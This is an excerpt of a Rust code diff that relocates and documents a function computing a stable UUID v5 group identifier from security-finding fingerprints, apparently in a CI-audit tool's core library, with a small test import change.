-pub fn compute_finding_group_id(fingerprint: &str) -> String {
-    // UUID v5 = SHA-1(namespace || name), with version + variant bits set.
-    // Implemented inline so taudit-core stays free of the `uuid` crate
-    // dependency (workspace already depends on it from the CLI; core
-    // remains zero-IO and minimal).
-    const NAMESPACE: [u8; 16] = [
-        0x6c, 0x6f, 0xd0, 0xa3, 0x82, 0x44, 0x4f, 0x29, 0xb1, 0x9a, 0x09, 0xc8, 0x7e, 0x49, 0x55,
-        0x21,
-    ];
-
-    use sha1::{Digest as Sha1Digest, Sha1};
-    let mut hasher = Sha1::new();
-    Sha1Digest::update(&mut hasher, NAMESPACE);
-    Sha1Digest::update(&mut hasher, fingerprint.as_bytes());
-    let hash = hasher.finalize();
-
-    let mut bytes = [0u8; 16];
-    bytes.copy_from_slice(&hash[..16]);
-    // RFC 4122 §4.3: set version to 5 (bits 12-15 of time_hi_and_version)
-    bytes[6] = (bytes[6] & 0x0f) | 0x50;
-    // RFC 4122 §4.4: set variant to RFC 4122 (bits 6-7 of clock_seq_hi)
-    bytes[8] = (bytes[8] & 0x3f) | 0x80;
-
-    format!(
-        "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
-        bytes[0], bytes[1], bytes[2], bytes[3],
-        bytes[4], bytes[5],
-        bytes[6], bytes[7],
-        bytes[8], bytes[9],
-        bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15],
-    )
-}
-
-// ── Finding fingerprint ────────────────────────────────────
+// ── Finding fingerprint ───────────────────────────────────────────────
 //
 // Stable cross-run identifier for a finding. Surfaces in:
 //
@@ -845,6 +213,53 @@ pub fn rule_id_for(finding: &Finding) -> String {
     extract_custom_rule_id(&finding.message)
         .map(str::to_string)
         .unwrap_or_else(|| category_rule_id(&finding.category).to_string())
+}
+
+/// Stable UUID v5 over the finding fingerprint. Two findings whose
+/// fingerprints match (same rule + file + root authority) produce the
+/// same `finding_group_id` — that is the whole point: SIEMs and triage
+/// dashboards collapse N hops against a single secret into one row.
+///
+/// The UUID v5 namespace is a fixed UUID v4 derived once and embedded
+/// here. Treating the namespace as load-bearing is intentional: any
+/// future change here would break every consumer that has stored a
+/// `finding_group_id`. Bump only at a major version.
+///
+/// **API stability:** marked `#[doc(hidden)]` because `taudit-core` is a
+/// workspace-internal library. External consumers should read the
+/// `finding_group_id` field from the JSON / SARIF / CloudEvents output.
+#[doc(hidden)]
+pub fn compute_finding_group_id(fingerprint: &str) -> String {
+    // UUID v5 = SHA-1(namespace || name), with version + variant bits set.
+    // Implemented inline so taudit-core stays free of the `uuid` crate
+    // dependency (workspace already depends on it from the CLI; core
+    // remains zero-IO and minimal).
+    const NAMESPACE: [u8; 16] = [
+        0x6c, 0x6f, 0xd0, 0xa3, 0x82, 0x44, 0x4f, 0x29, 0xb1, 0x9a, 0x09, 0xc8, 0x7e, 0x49, 0x55,
+        0x21,
+    ];
+
+    use sha1::{Digest as Sha1Digest, Sha1};
+    let mut hasher = Sha1::new();
+    Sha1Digest::update(&mut hasher, NAMESPACE);
+    Sha1Digest::update(&mut hasher, fingerprint.as_bytes());
+    let hash = hasher.finalize();
+
+    let mut bytes = [0u8; 16];
+    bytes.copy_from_slice(&hash[..16]);
+    // RFC 4122 §4.3: set version to 5 (bits 12-15 of time_hi_and_version)
+    bytes[6] = (bytes[6] & 0x0f) | 0x50;
+    // RFC 4122 §4.4: set variant to RFC 4122 (bits 6-7 of clock_seq_hi)
+    bytes[8] = (bytes[8] & 0x3f) | 0x80;
+
+    format!(
+        "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
+        bytes[0], bytes[1], bytes[2], bytes[3],
+        bytes[4], bytes[5],
+        bytes[6], bytes[7],
+        bytes[8], bytes[9],
+        bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15],
+    )
 }
 
 /// Compute a stable cross-run fingerprint for a finding.
@@ -1535,6 +950,7 @@ mod fingerprint_tests {
 #[cfg(test)]
 mod source_tests {
     use super::*;
+    use std::path::PathBuf;
 
     #[test]
     fn built_in_serializes_as_string() {
